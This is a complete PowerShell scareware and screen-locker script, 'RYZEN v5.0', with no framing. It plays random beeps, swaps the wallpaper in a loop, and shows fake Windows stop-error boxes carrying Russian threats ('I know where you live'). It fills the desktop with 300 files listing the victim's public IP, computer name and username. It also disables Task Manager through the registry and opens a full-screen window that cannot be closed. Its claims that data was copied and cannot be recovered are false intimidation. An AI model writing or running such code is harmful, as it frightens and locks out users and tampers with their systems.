# SYSTEM_AGONY.ps1 - RYZEN v5.0
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Start-Job -Name "SoundTerror" -ScriptBlock {
    while($true) {
        [console]::beep((Get-Random -Minimum 300 -Maximum 2500), (Get-Random -Minimum 100 -Maximum 800))
        Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 300)
        if ((Get-Random -Minimum 1 -Maximum 4) -eq 1) { [System.Media.SystemSounds]::Hand.Play() }
        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
    }
}

Start-Job -Name "ImageRotator" -ScriptBlock {
    $w = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
    $h = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
    $texts = @("Я ЗНАЮ ГДЕ ТЫ ЖИВЕШЬ", "ТЫ НЕ СПРЯЧЕШЬСЯ", "СИСТЕМА УНИЧТОЖЕНА", "ESCAPE IMPOSSIBLE", "ТВОИ ДАННЫЕ МОИ")
    while($true) {
        $bmp = New-Object System.Drawing.Bitmap($w, $h)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.Clear('Black')
        for($i=0; $i -lt 30; $i++) {
            $rx = Get-Random -Min 0 -Max $w
            $ry = Get-Random -Min 0 -Max $h
            $g.DrawRectangle([System.Drawing.Pens]::Red, $rx, $ry, (Get-Random -Min 50 -Max 300), (Get-Random -Min 30 -Max 100))
        }
        $font = New-Object System.Drawing.Font('Consolas', 72, [System.Drawing.FontStyle]::Bold)
        $text = $texts | Get-Random
        $size = $g.MeasureString($text, $font)
        $x = ($w - $size.Width) / 2
        $y = ($h - $size.Height) / 2
        $g.DrawString($text, $font, [System.Drawing.Brushes]::Red, $x, $y)
        $fontSmall = New-Object System.Drawing.Font('Consolas', 24)
        $g.DrawString("КОД: RYZEN-0xDEADBEEF | $(Get-Date)", $fontSmall, [System.Drawing.Brushes]::White, 50, $h - 100)
        $bmp.Save("$env:TEMP\ryzen_wall.png")
        $g.Dispose(); $bmp.Dispose()
        Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value "$env:TEMP\ryzen_wall.png"
        rundll32.exe user32.dll, UpdatePerUserSystemParameters
        Start-Sleep -Seconds (Get-Random -Min 3 -Max 7)
    }
}

Start-Job -Name "ErrorMessages" -ScriptBlock {
    $errors = @("CRITICAL_PROCESS_DIED", "SYSTEM_SERVICE_EXCEPTION", "MEMORY_MANAGEMENT", "KERNEL_DATA_INPAGE_ERROR", "IRQL_NOT_LESS_OR_EQUAL", "PAGE_FAULT_IN_NONPAGED_AREA")
    while($true) {
        $err = $errors | Get-Random
        [System.Windows.Forms.MessageBox]::Show("STOP: 0x$(Get-Random -Min 1000 -Max 9999)`n$err`n`nЯ ЗНАЮ ГДЕ ТЫ ЖИВЕШЬ", "СИСТЕМНАЯ ОШИБКА", "OK", "Error")
        Start-Sleep -Seconds (Get-Random -Min 4 -Max 10)
    }
}

$desktop = [Environment]::GetFolderPath('Desktop')
for ($i = 1; $i -le 300; $i++) {
    $msg = @"
╔══════════════════════════════════╗
║  🚨 Я ЗНАЮ ГДЕ ТЫ ЖИВЕШЬ 🚨     ║
║  IP: $(Invoke-RestMethod -Uri 'http://ifconfig.me/ip' -ErrorAction SilentlyContinue)
║  ВРЕМЯ: $(Get-Date)
║  СИСТЕМА: $env:COMPUTERNAME
║  ПОЛЬЗОВАТЕЛЬ: $env:USERNAME
║  ══════════════════════════════ ║
║  ДАННЫЕ СКОПИРОВАНЫ             ║
║  ВОССТАНОВЛЕНИЕ НЕВОЗМОЖНО      ║
╚══════════════════════════════════╝
"@
    $msg | Out-File "$desktop\RYZEN_ALERT_$i.txt" -Encoding UTF8
}

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -PropertyType DWORD -Force

$lockForm = New-Object System.Windows.Forms.Form
$lockForm.WindowState = 'Maximized'
$lockForm.FormBorderStyle = 'None'
$lockForm.TopMost = $true
$lockForm.ControlBox = $false
$lockForm.BackColor = 'Black'

$label = New-Object System.Windows.Forms.Label
$label.Text = @"

    ██████╗ ██╗   ██╗███████╗███████╗███╗   ██╗
    ██╔══██╗╚██╗ ██╔╝╚══███╔╝██╔════╝████╗  ██║
    ██████╔╝ ╚████╔╝   ███╔╝ █████╗  ██╔██╗ ██║
    ██╔══██╗  ╚██╔╝   ███╔╝  ██╔══╝  ██║╚██╗██║
    ██║  ██║   ██║   ███████╗███████╗██║ ╚████║
    ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝

         🚨 ВИНДОВС ЗАБЛОКИРОВАН 🚨

    КОД ОШИБКИ: RYZEN-0xDEADBEEF

         Я ЗНАЮ ГДЕ ТЫ ЖИВЕШЬ

    IP: $(Invoke-RestMethod -Uri 'http://ifconfig.me/ip' -ErrorAction SilentlyContinue)
    ВРЕМЯ: $(Get-Date)

    [СИСТЕМА НЕ ПОДЛЕЖИТ ВОССТАНОВЛЕНИЮ]
"@
$label.ForeColor = 'Red'
$label.Font = 'Consolas,12'
$label.AutoSize = $false
$label.Size = '1200,800'
$label.TextAlign = 'MiddleCenter'
$label.Dock = 'Fill'
$lockForm.Controls.Add($label)

$lockForm.Add_FormClosing({ $_.Cancel = $true })
$lockForm.ShowDialog()
